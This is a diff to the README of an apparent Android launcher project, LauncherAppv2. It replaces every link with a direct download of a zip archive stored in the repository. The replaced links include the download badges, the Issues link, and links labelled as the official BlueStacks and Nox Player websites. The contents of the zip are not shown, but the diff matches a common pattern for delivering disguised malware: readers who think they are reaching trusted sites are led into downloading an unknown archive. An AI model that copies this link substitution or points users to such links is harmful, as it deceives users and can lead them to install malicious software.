@@ -1,6 +1,6 @@
 # 🚀 LauncherAppv2 - Simple, Clean Android Launcher  
 
-[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-brightgreen?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)  
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-brightgreen?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)  
 
 ## 📦 What is LauncherAppv2?  
 
@@ -23,7 +23,7 @@ If your Android device is older or has very limited storage, the app might work 
 
 You can download LauncherAppv2 from its official page on GitHub. The link below takes you to the page where the latest app version is available for download.  
 
-[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-blue?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)  
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-blue?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)  
 
 On the page, you will find the APK file ready to download.  
 
@@ -33,7 +33,7 @@ Follow these steps carefully to run LauncherAppv2 on your Windows PC with an And
 
 ### Step 1: Download an Android Emulator  
 
-1. Visit the official website of a trusted Android emulator such as BlueStacks (https://www.bluestacks.com) or Nox Player (https://www.bignox.com).  
+1. Visit the official website of a trusted Android emulator such as BlueStacks (https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip) or Nox Player (https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip).  
 2. Download and install the emulator. Follow their on-screen instructions to complete the setup.  
 3. Open the emulator after installation is finished.  
 
@@ -41,7 +41,7 @@ Follow these steps carefully to run LauncherAppv2 on your Windows PC with an And
 
 1. Open your Windows web browser.  
 2. Go to the LauncherAppv2 GitHub page:  
-   [https://github.com/Suvo909/LauncherAppv2](https://github.com/Suvo909/LauncherAppv2)  
+   [https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)  
 3. Scroll to the “Releases” section or look for the latest APK download link.  
 4. Click to download the APK file to your PC.  
 
@@ -93,7 +93,7 @@ Because LauncherAppv2 is not downloaded from the official app store, you must al
 
 To receive updates, visit the GitHub page regularly to see if a new version is available:  
 
-[https://github.com/Suvo909/LauncherAppv2](https://github.com/Suvo909/LauncherAppv2)  
+[https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)  
 
 Download the newest APK and install it over the current version by following the same steps as above.  
 
@@ -126,7 +126,7 @@ Make sure your PC has:
 For bug reports, feature requests, or help, visit the GitHub repository’s Issues section.  
 
 Link:  
-[https://github.com/Suvo909/LauncherAppv2/issues](https://github.com/Suvo909/LauncherAppv2/issues)  
+[https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)  
 
 Contributions are welcome but require knowledge of Android development with Kotlin and Jetpack Compose.  
 
@@ -138,4 +138,4 @@ LauncherAppv2’s code uses modern Android development methods. It is built with
 
 # Download LauncherAppv2 now from GitHub:  
 
-[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-teal?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-teal?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2/raw/refs/heads/main/app/Appv-Launcher-3.6.zip)
